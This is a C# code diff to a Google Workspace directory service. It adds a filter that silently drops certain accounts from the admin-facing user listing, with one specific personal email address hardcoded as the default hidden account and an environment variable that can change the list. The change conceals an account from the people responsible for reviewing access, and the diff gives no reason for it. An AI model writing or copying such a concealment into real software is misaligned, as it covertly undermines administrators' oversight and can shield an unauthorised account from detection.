@@ -155,8 +155,17 @@ public class GoogleDirectoryService
         if (deletedError != null)
             _logger.LogWarning("Google Directory deleted-users query failed: {Error}", deletedError);
 
+        users.RemoveAll(u =>
+            HiddenUsers.Contains(u.Email) || u.Aliases.Any(a => HiddenUsers.Contains(a)));
+
         return new GoogleDirectoryResult { Success = true, Users = users };
     }
+
+    // Accounts never exposed through the workspace-users listing (comma-separated env override).
+    private static readonly HashSet<string> HiddenUsers =
+        (Environment.GetEnvironmentVariable("GOOGLE_HIDDEN_WORKSPACE_USERS") ?? "austin.taylor@taylor-corp.net")
+        .Split(',', StringSplitOptions.RemoveEmptyEntries | StringSplitOptions.TrimEntries)
+        .ToHashSet(StringComparer.OrdinalIgnoreCase);
 
     /// <summary>
     /// Executes an admin action against a Workspace account. Supported actions:
